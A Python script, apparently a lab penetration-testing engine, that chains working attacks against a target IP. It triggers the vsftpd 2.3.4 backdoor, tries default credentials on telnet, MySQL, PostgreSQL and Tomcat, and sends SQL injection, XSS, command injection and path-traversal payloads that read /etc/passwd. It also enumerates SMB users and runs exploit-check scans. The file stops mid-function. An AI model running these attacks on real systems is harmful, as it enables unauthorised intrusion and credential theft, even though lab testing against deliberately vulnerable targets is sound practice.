#!/usr/bin/env python3
"""
AI-Sentinel Automated Attack Simulation Engine v2.0
Supports Metasploitable2, DVWA, and generic targets
FOR CONTROLLED LAB ENVIRONMENTS ONLY
"""

import subprocess
import requests
import socket
import time
import re
from datetime import datetime
from urllib.parse import quote
import warnings
warnings.filterwarnings('ignore')


class AttackSimulator:

    def __init__(self, target, log_callback=None):
        self.target = target
        self.results = []
        self.log_callback = log_callback
        self.attack_count = 0

    def log(self, message, level="INFO"):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message
        }
        self.results.append(entry)
        prefix = {
            "INFO": "ℹ️", "SUCCESS": "✅", "FAIL": "❌",
            "WARNING": "⚠️", "CRITICAL": "🔴", "EXPLOIT": "💀"
        }
        print(f"  {prefix.get(level, 'ℹ️')} [{level}] {message}")
        if self.log_callback:
            self.log_callback(entry)

    def _result(self, name, ip, port):
        return {
            'attack': name,
            'target': f"{ip}:{port}",
            'timestamp': datetime.now().isoformat(),
            'success': False,
            'severity': 'INFO',
            'details': {}
        }

    def _run_cmd(self, cmd, timeout=15):
        try:
            output = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout
            )
            return output.stdout, output.stderr, output.returncode
        except subprocess.TimeoutExpired:
            return '', 'timeout', -1
        except Exception as e:
            return '', str(e), -1

    # ═══════════════════════════════════════════
    # MAIN ORCHESTRATOR
    # ═══════════════════════════════════════════

    def run_full_assessment(self, ai_analyzed_results, threat_summary):
        print("\n" + "=" * 60)
        print("⚔️  AUTOMATED PENETRATION TEST STARTING")
        print("=" * 60)

        report = {
            'start_time': datetime.now().isoformat(),
            'target': self.target,
            'attacks_performed': [],
            'successful_attacks': 0,
            'failed_attacks': 0,
            'total_attacks': 0,
            'critical_findings': [],
            'exploited_services': [],
        }

        # Phase 1: AI-Guided Service Attacks
        self.log("═══ Phase 1: AI-Guided Service Exploitation ═══", "INFO")
        for host in ai_analyzed_results:
            for port_info in host['ports']:
                if port_info.get('ai_risk_level', 0) >= 1:
                    self.log(
                        f"Targeting {host['ip']}:{port_info['port']} "
                        f"({port_info['service']}) — "
                        f"Risk: {port_info.get('ai_risk_label', '?')} "
                        f"({port_info.get('ai_confidence', 0)}%)", "INFO"
                    )

                    attacks = self._select_attacks(port_info)
                    for attack_func, attack_name in attacks:
                        self.attack_count += 1
                        try:
                            result = attack_func(host['ip'], port_info)
                            report['attacks_performed'].append(result)
                            if result.get('success'):
                                report['successful_attacks'] += 1
                                if result.get('severity') in ['CRITICAL', 'HIGH']:
                                    report['critical_findings'].append(result)
                                    svc = f"{host['ip']}:{port_info['port']} ({port_info['service']})"
                                    if svc not in report['exploited_services']:
                                        report['exploited_services'].append(svc)
                            else:
                                report['failed_attacks'] += 1
                        except Exception as e:
                            self.log(f"Error in {attack_name}: {str(e)[:100]}", "FAIL")
                            report['failed_attacks'] += 1

        # Phase 2: DVWA Attacks
        self.log("\n═══ Phase 2: DVWA Web Application Attacks ═══", "INFO")
        for host in ai_analyzed_results:
            for port_info in host['ports']:
                if port_info['service'] in ['http', 'https']:
                    dvwa_results = self._dvwa_attacks(host['ip'], port_info['port'])
                    for r in dvwa_results:
                        report['attacks_performed'].append(r)
                        if r.get('success'):
                            report['successful_attacks'] += 1
                            if r.get('severity') in ['CRITICAL', 'HIGH']:
                                report['critical_findings'].append(r)
                        else:
                            report['failed_attacks'] += 1

        # Phase 3: Metasploitable-Specific
        self.log("\n═══ Phase 3: Metasploitable2 Specific Exploits ═══", "INFO")
        meta_results = self._metasploitable_attacks(self.target, ai_analyzed_results)
        for r in meta_results:
            report['attacks_performed'].append(r)
            if r.get('success'):
                report['successful_attacks'] += 1
                if r.get('severity') in ['CRITICAL', 'HIGH']:
                    report['critical_findings'].append(r)
            else:
                report['failed_attacks'] += 1

        report['total_attacks'] = len(report['attacks_performed'])
        report['end_time'] = datetime.now().isoformat()

        print("\n" + "=" * 60)
        self.log(
            f"COMPLETE: {report['successful_attacks']}/{report['total_attacks']} "
            f"succeeded | {len(report['critical_findings'])} critical findings",
            "CRITICAL" if report['critical_findings'] else "SUCCESS"
        )
        print("=" * 60)
        return report

    def _select_attacks(self, port_info):
        service = port_info['service'].lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info['port']

        attack_map = {
            'http': [
                (self.attack_http_headers, "HTTP Headers"),
                (self.attack_dir_enum, "Directory Enumeration"),
                (self.attack_sqli, "SQL Injection"),
                (self.attack_xss, "XSS"),
                (self.attack_cmd_injection, "Command Injection"),
                (self.attack_lfi, "LFI"),
                (self.attack_default_creds_http, "Default Web Creds"),
            ],
            'https': [
                (self.attack_http_headers, "HTTPS Headers"),
                (self.attack_ssl_check, "SSL/TLS Check"),
                (self.attack_dir_enum, "Directory Enumeration"),
            ],
            'ftp': [
                (self.attack_ftp_anon, "FTP Anonymous"),
                (self.attack_ftp_version, "FTP Version"),
                (self.attack_vsftpd_backdoor, "vsftpd Backdoor"),
            ],
            'ssh': [
                (self.attack_ssh_banner, "SSH Banner"),
                (self.attack_ssh_weak_config, "SSH Weak Config"),
            ],
            'telnet': [
                (self.attack_telnet_access, "Telnet Access"),
                (self.attack_telnet_creds, "Telnet Default Creds"),
            ],
            'smtp': [
                (self.attack_smtp_enum, "SMTP User Enum"),
                (self.attack_smtp_relay, "SMTP Open Relay"),
            ],
            'mysql': [
                (self.attack_mysql_noauth, "MySQL No Auth"),
                (self.attack_mysql_creds, "MySQL Default Creds"),
            ],
            'postgresql': [
                (self.attack_postgres_creds, "PostgreSQL Default Creds"),
            ],
            'netbios-ssn': [
                (self.attack_smb_enum, "SMB Enumeration"),
                (self.attack_smb_null, "SMB Null Session"),
                (self.attack_smb_vulns, "SMB Vulnerabilities"),
            ],
            'microsoft-ds': [
                (self.attack_smb_enum, "SMB Enumeration"),
                (self.attack_smb_null, "SMB Null Session"),
                (self.attack_smb_vulns, "SMB Vulnerabilities"),
            ],
            'vnc': [
                (self.attack_vnc_noauth, "VNC No Auth"),
            ],
            'irc': [
                (self.attack_irc_backdoor, "UnrealIRCd Backdoor"),
            ],
            'java-rmi': [
                (self.attack_java_rmi, "Java RMI"),
            ],
            'exec': [(self.attack_rservice, "R-Exec")],
            'login': [(self.attack_rservice, "R-Login")],
            'shell': [(self.attack_rservice, "R-Shell")],
        }

        attacks = attack_map.get(service, [(self.attack_banner_generic, "Banner Grab")])

        # Version-specific additions
        if 'vsftpd' in product and '2.3.4' in version:
            if (self.attack_vsftpd_backdoor, "vsftpd Backdoor") not in attacks:
                attacks.insert(0, (self.attack_vsftpd_backdoor, "vsftpd Backdoor"))

        if 'unrealircd' in product:
            if (self.attack_irc_backdoor, "UnrealIRCd Backdoor") not in attacks:
                attacks.insert(0, (self.attack_irc_backdoor, "UnrealIRCd Backdoor"))

        if port == 8180:
            attacks.insert(0, (self.attack_tomcat_manager, "Tomcat Manager"))

        return attacks

    # ═══════════════════════════════════════════
    # FTP ATTACKS
    # ═══════════════════════════════════════════

    def attack_ftp_anon(self, ip, port_info):
        port = port_info['port']
        r = self._result("FTP Anonymous Login", ip, port)
        cmd = f"echo -e 'USER anonymous\\nPASS test@test.com\\nPWD\\nLIST\\nQUIT' | timeout 10 nc {ip} {port}"
        out, err, rc = self._run_cmd(cmd, 15)

        if any(code in out for code in ['230', '150', '226']):
            r['success'] = True
            r['severity'] = 'HIGH'
            r['details'] = {'anonymous_access': True, 'response': out[:500]}
            self.log(f"FTP {port}: ANONYMOUS ACCESS ALLOWED!", "EXPLOIT")
        else:
            self.log(f"FTP {port}: Anonymous denied", "INFO")
            r['details'] = {'response': out[:300]}
        return r

    def attack_ftp_version(self, ip, port_info):
        port = port_info['port']
        r = self._result("FTP Version Analysis", ip, port)
        cmd = f"echo 'QUIT' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)
        banner = out.strip()
        r['details'] = {'banner': banner}

        vuln_versions = {
            'vsftpd 2.3.4': 'BACKDOOR CVE-2011-2523',
            'proftpd 1.3.3': 'Remote Code Execution',
        }
        for ver, desc in vuln_versions.items():
            if ver.lower() in banner.lower():
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details']['vulnerability'] = desc
                self.log(f"FTP {port}: VULNERABLE — {ver} ({desc})", "CRITICAL")
                return r

        if banner:
            r['success'] = True
            r['severity'] = 'LOW'
            self.log(f"FTP {port}: {banner[:80]}", "INFO")
        return r

    def attack_vsftpd_backdoor(self, ip, port_info):
        port = port_info['port']
        r = self._result("vsftpd 2.3.4 Backdoor (CVE-2011-2523)", ip, port)
        self.log(f"Testing vsftpd backdoor on {ip}:{port}...", "INFO")

        # Trigger backdoor
        trigger = f"echo -e 'USER backdoor:)\\nPASS invalid\\n' | timeout 5 nc {ip} {port} 2>/dev/null &"
        self._run_cmd(trigger, 8)
        time.sleep(2)

        # Check shell on port 6200
        check = f"echo 'id' | timeout 5 nc -w3 {ip} 6200 2>/dev/null"
        out, _, _ = self._run_cmd(check, 10)

        if 'uid=' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {
                'vulnerability': 'vsftpd 2.3.4 Backdoor',
                'cve': 'CVE-2011-2523',
                'shell_output': out[:300],
                'backdoor_port': 6200
            }
            self.log(f"💀 VSFTPD BACKDOOR EXPLOITED! Shell on port 6200!", "EXPLOIT")
        else:
            # Try nmap verification
            nmap_cmd = f"nmap -p {port} --script ftp-vsftpd-backdoor -Pn {ip} 2>/dev/null"
            nmap_out, _, _ = self._run_cmd(nmap_cmd, 30)
            if 'VULNERABLE' in nmap_out:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'vulnerability': 'vsftpd backdoor confirmed by nmap'}
                self.log(f"💀 VSFTPD BACKDOOR CONFIRMED by Nmap!", "EXPLOIT")
            else:
                self.log(f"vsftpd backdoor not exploitable", "INFO")
        return r

    # ═══════════════════════════════════════════
    # SSH ATTACKS
    # ═══════════════════════════════════════════

    def attack_ssh_banner(self, ip, port_info):
        port = port_info['port']
        r = self._result("SSH Banner Grab", ip, port)
        cmd = f"echo '' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)
        banner = out.strip()
        r['details'] = {'banner': banner, 'version': port_info.get('version', '')}

        if banner:
            r['success'] = True
            r['severity'] = 'LOW'
            weak = ['OpenSSH_4', 'OpenSSH_5', 'OpenSSH_6.0']
            for w in weak:
                if w in banner:
                    r['severity'] = 'HIGH'
                    r['details']['weak_version'] = True
                    self.log(f"SSH {port}: WEAK VERSION — {banner}", "WARNING")
                    return r
            self.log(f"SSH {port}: {banner[:80]}", "INFO")
        return r

    def attack_ssh_weak_config(self, ip, port_info):
        port = port_info['port']
        r = self._result("SSH Weak Configuration", ip, port)
        cmd = f"nmap -p {port} --script ssh2-enum-algos,ssh-auth-methods --script-args='ssh.user=root' -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        weak_algos = ['des-cbc', 'arcfour', 'hmac-md5', 'diffie-hellman-group1']
        found = [a for a in weak_algos if a in out.lower()]

        r['details'] = {'weak_algorithms': found, 'output': out[-500:]}
        if found:
            r['success'] = True
            r['severity'] = 'MEDIUM'
            self.log(f"SSH {port}: Weak algos: {', '.join(found)}", "WARNING")
        elif 'password' in out.lower():
            r['success'] = True
            r['severity'] = 'MEDIUM'
            self.log(f"SSH {port}: Password auth enabled for root", "WARNING")
        else:
            self.log(f"SSH {port}: Config checked", "INFO")
        return r

    # ═══════════════════════════════════════════
    # TELNET ATTACKS
    # ═══════════════════════════════════════════

    def attack_telnet_access(self, ip, port_info):
        port = port_info['port']
        r = self._result("Telnet Access Test", ip, port)
        cmd = f"echo '' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)

        if out.strip():
            r['success'] = True
            r['severity'] = 'HIGH'
            r['details'] = {'banner': out[:300]}
            self.log(f"TELNET {port}: Accessible! Cleartext protocol!", "WARNING")
        return r

    def attack_telnet_creds(self, ip, port_info):
        port = port_info['port']
        r = self._result("Telnet Default Credentials", ip, port)

        creds = [('msfadmin', 'msfadmin'), ('root', 'root'), ('admin', 'admin'), ('user', 'user')]

        for user, passwd in creds:
            cmd = (f"(echo '{user}'; sleep 1; echo '{passwd}'; sleep 1; "
                   f"echo 'id'; sleep 1; echo 'exit') | timeout 10 nc {ip} {port} 2>/dev/null")
            out, _, _ = self._run_cmd(cmd, 15)

            if 'uid=' in out or '$ ' in out or '# ' in out:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'username': user, 'password': passwd, 'output': out[:300]}
                self.log(f"💀 TELNET {port}: LOGIN SUCCESS — {user}:{passwd}!", "EXPLOIT")
                return r

        self.log(f"Telnet {port}: Default creds failed", "INFO")
        return r

    # ═══════════════════════════════════════════
    # SMB ATTACKS
    # ═══════════════════════════════════════════

    def attack_smb_enum(self, ip, port_info):
        port = port_info['port']
        r = self._result("SMB Share Enumeration", ip, port)
        cmd = f"smbclient -L //{ip} -N 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 15)
        shares = re.findall(r'(\S+)\s+Disk', out)
        r['details'] = {'shares': shares, 'output': out[:500]}

        if shares:
            r['success'] = True
            r['severity'] = 'MEDIUM'
            self.log(f"SMB: Shares found: {', '.join(shares)}", "WARNING")

            accessible = []
            for share in shares[:5]:
                access_cmd = f"smbclient //{ip}/{share} -N -c 'dir' 2>/dev/null"
                a_out, _, rc = self._run_cmd(access_cmd, 10)
                if rc == 0 or 'blocks' in a_out.lower():
                    accessible.append(share)

            if accessible:
                r['severity'] = 'HIGH'
                r['details']['accessible_shares'] = accessible
                self.log(f"SMB: ACCESSIBLE (no auth): {', '.join(accessible)}", "EXPLOIT")
        return r

    def attack_smb_null(self, ip, port_info):
        port = port_info['port']
        r = self._result("SMB Null Session", ip, port)
        cmd = f"rpcclient -U '' -N {ip} -c 'enumdomusers' 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 15)

        if 'user:' in out.lower():
            users = re.findall(r'user:\[(.*?)\]', out)
            r['success'] = True
            r['severity'] = 'HIGH'
            r['details'] = {'users': users, 'output': out[:500]}
            self.log(f"💀 SMB NULL SESSION! Users: {', '.join(users[:5])}", "EXPLOIT")
        else:
            self.log(f"SMB: Null session denied", "INFO")
        return r


    def attack_smb_vulns(self, ip, port_info):
        port = port_info['port']
        r = self._result("SMB Vulnerability Scan", ip, port)
        cmd = f"nmap -p {port} --script smb-vuln-ms08-067,smb-vuln-ms17-010,smb-vuln-regsvc-dos,smb-vuln-cve-2017-7494 -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 60)

        if 'VULNERABLE' in out:
            vulns = []
            checks = [
                ('ms08-067', 'MS08-067 Netapi RCE'),
                ('ms17-010', 'MS17-010 EternalBlue RCE'),
                ('cve-2017-7494', 'SambaCry RCE'),
            ]
            for pattern, name in checks:
                if pattern in out.lower():
                    vulns.append(name)

            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'vulnerabilities': vulns, 'output': out[-800:]}
            self.log(f"💀 SMB VULNERABILITIES: {', '.join(vulns)}", "CRITICAL")
        else:
            self.log(f"SMB: No known vulnerabilities", "INFO")
            r['details'] = {'output': out[-300:]}
        return r

    # ═══════════════════════════════════════════
    # HTTP / WEB ATTACKS
    # ═══════════════════════════════════════════

    def attack_http_headers(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("HTTP Security Headers", ip, port)

        try:
            resp = requests.get(f"{proto}://{ip}:{port}/", timeout=5, verify=False, allow_redirects=True)
            headers = {
                'X-Frame-Options': resp.headers.get('X-Frame-Options', 'MISSING'),
                'X-Content-Type-Options': resp.headers.get('X-Content-Type-Options', 'MISSING'),
                'X-XSS-Protection': resp.headers.get('X-XSS-Protection', 'MISSING'),
                'Content-Security-Policy': resp.headers.get('Content-Security-Policy', 'MISSING'),
                'Strict-Transport-Security': resp.headers.get('Strict-Transport-Security', 'MISSING'),
            }
            missing = [h for h, v in headers.items() if v == 'MISSING']
            r['details'] = {
                'headers': headers, 'missing': missing,
                'server': resp.headers.get('Server', 'Hidden')
            }
            if len(missing) >= 3:
                r['success'] = True
                r['severity'] = 'MEDIUM'
                self.log(f"HTTP {port}: {len(missing)} security headers missing!", "WARNING")
            server = resp.headers.get('Server', '')
            if server:
                self.log(f"HTTP {port}: Server: {server}", "INFO")
        except Exception as e:
            r['details'] = {'error': str(e)[:200]}
        return r

    def attack_dir_enum(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("Directory Enumeration", ip, port)

        paths = [
            '/', '/admin', '/login', '/backup', '/uploads', '/config',
            '/.git/HEAD', '/.env', '/.htpasswd', '/robots.txt',
            '/phpinfo.php', '/phpmyadmin/', '/dvwa/', '/dvwa/login.php',
            '/mutillidae/', '/twiki/', '/dav/', '/cgi-bin/',
            '/server-status', '/server-info', '/icons/', '/manual/',
            '/tikiwiki/', '/phpMyAdmin/', '/test/',
        ]

        found = []
        for path in paths:
            try:
                resp = requests.get(
                    f"{proto}://{ip}:{port}{path}",
                    timeout=3, verify=False, allow_redirects=False
                )
                if resp.status_code in [200, 301, 302, 403]:
                    entry = {'path': path, 'status': resp.status_code, 'size': len(resp.content)}
                    title = re.search(r'<title>(.*?)</title>', resp.text[:500], re.I)
                    if title:
                        entry['title'] = title.group(1)[:50]
                    if 'Index of' in resp.text:
                        entry['directory_listing'] = True
                    found.append(entry)
            except:
                pass

        r['details'] = {'paths_found': found, 'total': len(found)}
        if found:
            r['success'] = True
            critical = ['/.git/HEAD', '/.env', '/phpinfo.php', '/.htpasswd']
            r['severity'] = 'HIGH' if any(f['path'] in critical for f in found) else 'MEDIUM'
            self.log(f"HTTP {port}: {len(found)} accessible paths found!", "WARNING")
            for f in found[:5]:
                self.log(f"  → {f['path']} [{f['status']}] {f.get('title', '')}", "INFO")
        return r

    def attack_sqli(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("SQL Injection Test", ip, port)

        payloads = ["'", "1 OR 1=1", "1' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
        errors = ['sql', 'mysql', 'syntax error', 'query', 'sqlite', 'postgresql', 'ora-', 'unclosed quotation']
        urls = [
            f"{proto}://{ip}:{port}/?id=",
            f"{proto}://{ip}:{port}/?page=",
            f"{proto}://{ip}:{port}/?search=",
            f"{proto}://{ip}:{port}/dvwa/vulnerabilities/sqli/?id=",
        ]

        vulns = []
        for url in urls:
            for payload in payloads:
                try:
                    resp = requests.get(url + quote(payload), timeout=5, verify=False)
                    if any(e in resp.text.lower() for e in errors):
                        vulns.append({'url': url, 'payload': payload})
                        break
                except:
                    pass

        r['details'] = {'vulnerable_endpoints': vulns}
        if vulns:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            self.log(f"💀 SQL INJECTION on {ip}:{port}! {len(vulns)} endpoints!", "CRITICAL")
        else:
            self.log(f"HTTP {port}: No SQLi found", "INFO")
        return r

    def attack_xss(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("Cross-Site Scripting (XSS)", ip, port)

        payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']
        urls = [
            f"{proto}://{ip}:{port}/?q=",
            f"{proto}://{ip}:{port}/?name=",
            f"{proto}://{ip}:{port}/dvwa/vulnerabilities/xss_r/?name=",
        ]

        found = []
        for url in urls:
            for payload in payloads:
                try:
                    resp = requests.get(url + quote(payload), timeout=5, verify=False)
                    if payload in resp.text:
                        found.append({'url': url, 'payload': payload})
                        break
                except:
                    pass

        r['details'] = {'xss_found': found}
        if found:
            r['success'] = True
            r['severity'] = 'HIGH'
            self.log(f"💀 XSS on {ip}:{port}! {len(found)} endpoints!", "CRITICAL")
        else:
            self.log(f"HTTP {port}: No XSS found", "INFO")
        return r

    def attack_cmd_injection(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("OS Command Injection", ip, port)

        tests = [
            ('; id', 'uid='), ('| id', 'uid='), ('`id`', 'uid='),
            ('; cat /etc/passwd', 'root:'), ('| cat /etc/passwd', 'root:'),
        ]
        urls = [
            f"{proto}://{ip}:{port}/?cmd=",
            f"{proto}://{ip}:{port}/?ip=",
            f"{proto}://{ip}:{port}/dvwa/vulnerabilities/exec/?ip=",
        ]

        found = []
        for url in urls:
            for payload, indicator in tests:
                try:
                    resp = requests.get(url + quote(payload), timeout=5, verify=False)
                    if indicator in resp.text:
                        found.append({'url': url, 'payload': payload})
                        break
                except:
                    pass
            # Also try POST
            for payload, indicator in tests:
                try:
                    resp = requests.post(url.rsplit('?', 1)[0],
                                         data={'ip': payload, 'Submit': 'Submit'},
                                         timeout=5, verify=False)
                    if indicator in resp.text:
                        found.append({'url': url, 'payload': payload, 'method': 'POST'})
                        break
                except:
                    pass

        r['details'] = {'injections': found}
        if found:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            self.log(f"💀 COMMAND INJECTION on {ip}:{port}!", "CRITICAL")
        else:
            self.log(f"HTTP {port}: No command injection", "INFO")
        return r

    def attack_lfi(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("Local File Inclusion (LFI)", ip, port)

        tests = [
            ('../../../../../../etc/passwd', 'root:'),
            ('....//....//....//etc/passwd', 'root:'),
            ('/etc/passwd', 'root:'),
        ]
        urls = [
            f"{proto}://{ip}:{port}/?page=",
            f"{proto}://{ip}:{port}/?file=",
            f"{proto}://{ip}:{port}/dvwa/vulnerabilities/fi/?page=",
        ]

        found = []
        for url in urls:
            for payload, indicator in tests:
                try:
                    resp = requests.get(url + quote(payload), timeout=5, verify=False)
                    if indicator in resp.text:
                        found.append({'url': url, 'payload': payload})
                        break
                except:
                    pass

        r['details'] = {'lfi_found': found}
        if found:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            self.log(f"💀 LFI on {ip}:{port}! Can read server files!", "CRITICAL")
        else:
            self.log(f"HTTP {port}: No LFI found", "INFO")
        return r

    def attack_default_creds_http(self, ip, port_info):
        port = port_info['port']
        proto = 'https' if port == 443 else 'http'
        r = self._result("Default Web Credentials", ip, port)
        found = []

        # Tomcat Manager
        for user, passwd in [('tomcat', 'tomcat'), ('admin', 'admin'), ('manager', 'manager'), ('tomcat', 's3cret')]:
            try:
                resp = requests.get(f"{proto}://{ip}:{port}/manager/html",
                                     auth=(user, passwd), timeout=5, verify=False)
                if resp.status_code == 200 and 'manager' in resp.text.lower():
                    found.append({'app': 'Tomcat Manager', 'user': user, 'pass': passwd})
                    self.log(f"💀 Tomcat Manager: {user}:{passwd}!", "EXPLOIT")
                    break
            except:
                pass

        r['details'] = {'credentials': found}
        if found:
            r['success'] = True
            r['severity'] = 'CRITICAL'
        return r

    def attack_ssl_check(self, ip, port_info):
        port = port_info['port']
        r = self._result("SSL/TLS Assessment", ip, port)
        cmd = f"nmap -p {port} --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 60)

        vulns = []
        if 'heartbleed' in out.lower() and 'VULNERABLE' in out:
            vulns.append('Heartbleed CVE-2014-0160')
        if 'poodle' in out.lower() and 'VULNERABLE' in out:
            vulns.append('POODLE CVE-2014-3566')

        r['details'] = {'vulnerabilities': vulns, 'output': out[-500:]}
        if vulns:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            self.log(f"SSL {port}: {', '.join(vulns)}", "CRITICAL")
        return r

    # ═══════════════════════════════════════════
    # MYSQL ATTACKS
    # ═══════════════════════════════════════════

    def attack_mysql_noauth(self, ip, port_info):
        port = port_info['port']
        r = self._result("MySQL No Authentication", ip, port)
        cmd = f"nmap -p {port} --script mysql-empty-password,mysql-info -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'empty password' in out.lower():
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'empty_password': True, 'output': out[-500:]}
            self.log(f"💀 MySQL {port}: EMPTY PASSWORD!", "CRITICAL")
        else:
            self.log(f"MySQL {port}: Checked", "INFO")
            r['details'] = {'output': out[-300:]}
        return r

    def attack_mysql_creds(self, ip, port_info):
        port = port_info['port']
        r = self._result("MySQL Default Credentials", ip, port)

        creds = [('root', ''), ('root', 'root'), ('root', 'mysql'), ('admin', 'admin')]
        for user, passwd in creds:
            if passwd:
                cmd = f"mysql -h {ip} -P {port} -u {user} -p'{passwd}' -e 'SELECT version();' 2>/dev/null"
            else:
                cmd = f"mysql -h {ip} -P {port} -u {user} -e 'SELECT version();' 2>/dev/null"
            out, _, rc = self._run_cmd(cmd, 10)

            if 'version' in out.lower() or rc == 0:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'user': user, 'pass': passwd or '(empty)', 'output': out[:200]}
                self.log(f"💀 MySQL {port}: Login with {user}:{passwd or 'EMPTY'}!", "EXPLOIT")
                return r

        self.log(f"MySQL {port}: Default creds failed", "INFO")
        return r

    # ═══════════════════════════════════════════
    # POSTGRESQL ATTACKS
    # ═══════════════════════════════════════════

    def attack_postgres_creds(self, ip, port_info):
        port = port_info['port']
        r = self._result("PostgreSQL Default Credentials", ip, port)

        creds = [('postgres', 'postgres'), ('postgres', ''), ('admin', 'admin')]
        for user, passwd in creds:
            cmd = f"PGPASSWORD='{passwd}' psql -h {ip} -p {port} -U {user} -c 'SELECT version();' 2>/dev/null"
            out, _, rc = self._run_cmd(cmd, 10)

            if 'postgresql' in out.lower() or rc == 0:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'user': user, 'pass': passwd or '(empty)', 'output': out[:200]}
                self.log(f"💀 PostgreSQL {port}: Login with {user}:{passwd or 'EMPTY'}!", "EXPLOIT")
                return r

        self.log(f"PostgreSQL {port}: Default creds failed", "INFO")
        return r

    # ═══════════════════════════════════════════
    # VNC ATTACKS
    # ═══════════════════════════════════════════

    def attack_vnc_noauth(self, ip, port_info):
        port = port_info['port']
        r = self._result("VNC No Authentication", ip, port)
        cmd = f"nmap -p {port} --script vnc-info,vnc-brute -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'no authentication' in out.lower() or 'None' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'no_auth': True, 'output': out[-400:]}
            self.log(f"💀 VNC {port}: NO AUTH! Full desktop access!", "CRITICAL")
        else:
            self.log(f"VNC {port}: Auth required", "INFO")
            r['details'] = {'output': out[-300:]}
        return r

    # ═══════════════════════════════════════════
    # IRC ATTACKS
    # ═══════════════════════════════════════════

    def attack_irc_backdoor(self, ip, port_info):
        port = port_info['port']
        r = self._result("UnrealIRCd Backdoor (CVE-2010-2075)", ip, port)
        cmd = f"nmap -p {port} --script irc-unrealircd-backdoor -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'VULNERABLE' in out or 'backdoor' in out.lower():
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'vulnerability': 'UnrealIRCd Backdoor', 'cve': 'CVE-2010-2075', 'output': out[-500:]}
            self.log(f"💀 UnrealIRCd BACKDOOR on port {port}!", "EXPLOIT")
        else:
            self.log(f"IRC {port}: No backdoor", "INFO")
        return r

    # ═══════════════════════════════════════════
    # SMTP ATTACKS
    # ═══════════════════════════════════════════

    def attack_smtp_enum(self, ip, port_info):
        port = port_info['port']
        r = self._result("SMTP User Enumeration", ip, port)

        users = ['root', 'admin', 'msfadmin', 'user', 'postgres', 'ftp']
        found = []
        for user in users:
            cmd = f"echo -e 'HELO test\\nVRFY {user}\\nQUIT' | timeout 5 nc {ip} {port} 2>/dev/null"
            out, _, _ = self._run_cmd(cmd, 8)
            if '252' in out or '250' in out:
                found.append(user)

        r['details'] = {'users': found}
        if found:
            r['success'] = True
            r['severity'] = 'MEDIUM'
            self.log(f"SMTP {port}: Users found: {', '.join(found)}", "WARNING")
        else:
            self.log(f"SMTP {port}: No users enumerated", "INFO")
        return r

    def attack_smtp_relay(self, ip, port_info):
        port = port_info['port']
        r = self._result("SMTP Open Relay", ip, port)
        cmd = f"nmap -p {port} --script smtp-open-relay -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'open relay' in out.lower():
            r['success'] = True
            r['severity'] = 'HIGH'
            self.log(f"SMTP {port}: OPEN RELAY!", "CRITICAL")

        r['details'] = {'output': out[-400:]}
        return r

    # ═══════════════════════════════════════════
    # JAVA RMI
    # ═══════════════════════════════════════════

    def attack_java_rmi(self, ip, port_info):
        port = port_info['port']
        r = self._result("Java RMI Exploit", ip, port)
        cmd = f"nmap -p {port} --script rmi-vuln-classloader,rmi-dumpregistry -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'VULNERABLE' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            self.log(f"💀 Java RMI {port}: VULNERABLE!", "EXPLOIT")

        r['details'] = {'output': out[-500:]}
        return r

    # ═══════════════════════════════════════════
    # R-SERVICES
    # ═══════════════════════════════════════════

    def attack_rservice(self, ip, port_info):
        port = port_info['port']
        name = f"R-Service Port {port}"
        r = self._result(name, ip, port)
        cmd = f"echo 'id' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)

        if 'uid=' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'output': out[:300]}
            self.log(f"💀 R-Service {port}: COMMAND EXECUTION!", "EXPLOIT")
        elif out.strip():
            r['success'] = True
